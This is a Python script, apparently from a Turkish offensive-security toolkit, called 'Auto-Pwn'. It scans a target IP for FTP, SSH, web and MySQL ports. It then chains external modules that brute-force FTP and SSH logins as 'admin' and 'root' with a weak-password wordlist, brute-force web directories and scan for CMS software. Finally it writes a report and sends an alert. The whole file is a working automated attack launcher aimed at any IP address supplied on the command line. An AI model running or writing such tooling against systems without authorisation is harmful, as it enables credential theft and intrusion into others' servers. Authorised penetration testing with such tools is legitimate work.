#!/usr/bin/env python3
"""
Auto-Pwn Engine (Otopilot Sızma Testi)
======================================
Hedef IP'deki açık portları bulur ve uygun modülleri zincirleme olarak çalıştırır.
"""
import sys
import os
import socket
import subprocess
import time
from concurrent.futures import ThreadPoolExecutor

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import Sistem.Bildirim_Sistemi as Notifier

base_dir = os.path.dirname(os.path.abspath(__file__))
moduller_dir = os.path.dirname(base_dir)

def check_port(ip, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1.0)
            if s.connect_ex((ip, port)) == 0:
                return port
    except:
        pass
    return None

def run_module(name, cmd_args):
    print(f"\n\033[93m[*] Otopilot Başlatıyor: {name}\033[0m")
    try:
        # Arka planda çalıştır ve çıktısını yakala
        result = subprocess.run(cmd_args, capture_output=True, text=True, timeout=120)
        return result.stdout
    except subprocess.TimeoutExpired:
        return f"[{name}] Zaman aşımına uğradı (120s)."
    except Exception as e:
        return f"[{name}] Hata: {e}"

def auto_pwn(target_ip, wordlist_path=None):
    print(f"\n\033[96m[+] Otopilot (Auto-Pwn) Başlatıldı: {target_ip}\033[0m")
    print(f"\033[90m[*] Portlar taranıyor (21, 22, 80, 443, 8080, 3306)...\033[0m")
    
    ports_to_scan = [21, 22, 80, 443, 8080, 3306]
    open_ports = []
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        results = executor.map(lambda p: check_port(target_ip, p), ports_to_scan)
        for p in results:
            if p: open_ports.append(p)

    if not open_ports:
        print("\033[91m[-] Hedefte açık servis bulunamadı. Otopilot sonlandırılıyor.\033[0m")
        Notifier.send_alert(f"Auto-Pwn failed for {target_ip}: No open ports found.", title="🤖 AUTO-PWN STATUS")
        return

    print(f"\033[92m[+] Açık Portlar Bulundu: {open_ports}\033[0m")
    
    if not wordlist_path or not os.path.exists(wordlist_path):
        wordlist_path = os.path.join(os.path.dirname(base_dir), "Wordlists", "common.txt")
        # Eğer yoksa ufak bir dummy wordlist oluştur
        if not os.path.exists(wordlist_path):
            os.makedirs(os.path.dirname(wordlist_path), exist_ok=True)
            with open(wordlist_path, "w") as f:
                f.write("admin\nroot\n123456\npassword\n")

    report = f"Auto-Pwn Report for {target_ip}\nOpen Ports: {open_ports}\n\n"
    
    for port in open_ports:
        if port == 21:
            cmd = [sys.executable, os.path.join(moduller_dir, "06_Sifre_Kirici_Araclar", "FTP_Bruteforce.py"), target_ip, "admin", wordlist_path]
            out = run_module("FTP_Bruteforce", cmd)
            report += f"--- FTP (21) ---\n{out}\n"
        elif port == 22:
            cmd = [sys.executable, os.path.join(moduller_dir, "06_Sifre_Kirici_Araclar", "SSH_Bruteforce.py"), target_ip, "root", wordlist_path]
            out = run_module("SSH_Bruteforce", cmd)
            report += f"--- SSH (22) ---\n{out}\n"
        elif port in [80, 8080]:
            url = f"http://{target_ip}:{port}"
            
            # Dir Buster
            cmd_dir = [sys.executable, os.path.join(moduller_dir, "12_Web_Zafiyet_Araclari", "Directory_Bruteforcer.py"), url, wordlist_path]
            out_dir = run_module(f"Directory_Bruteforcer ({port})", cmd_dir)
            report += f"--- DirBuster ({port}) ---\n{out_dir}\n"
            
            # CMS Scanner
            cmd_cms = [sys.executable, os.path.join(moduller_dir, "12_Web_Zafiyet_Araclari", "CMS_Scanner.py"), url]
            out_cms = run_module(f"CMS_Scanner ({port})", cmd_cms)
            report += f"--- CMS Scanner ({port}) ---\n{out_cms}\n"

    print(f"\n\033[92m[+] Auto-Pwn Tamamlandı! Rapor oluşturuluyor...\033[0m")
    
    report_file = f"autopwn_{target_ip.replace('.', '_')}.txt"
    with open(report_file, "w", encoding="utf-8") as f:
        f.write(report)
        
    print(f"\033[92m[+] Rapor Kaydedildi: {os.path.abspath(report_file)}\033[0m")
    
    Notifier.send_alert(f"Auto-Pwn completed for {target_ip}.\nOpen Ports: {open_ports}\nCheck local report: {report_file}", title="🤖 AUTO-PWN SUCCESS!")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Kullanım: python Auto_Pwn.py <Hedef_IP> [Wordlist_Yolu]")
        sys.exit(1)
        
    target = sys.argv[1]
    wlist = sys.argv[2] if len(sys.argv) > 2 else None
    auto_pwn(target, wlist)
